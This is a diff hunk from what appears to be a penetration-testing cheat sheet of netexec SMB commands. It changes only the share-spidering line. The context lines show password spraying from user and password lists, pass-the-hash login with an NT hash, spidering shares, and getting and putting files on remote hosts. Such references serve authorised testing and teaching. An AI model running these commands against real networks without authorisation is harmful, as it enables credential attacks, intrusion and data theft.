@@ -281,7 +281,7 @@ netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
 # NTHASH
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -H 'NTHASH'
 # Spidering Shares
-netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' -M spider_plus
+netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M spider_plus
 # Get and Put Files
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --get-file 'REMOTEPATH' 'LOCALPATH'
 netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --put-file 'LOCALPATH' 'REMOTEPATH'
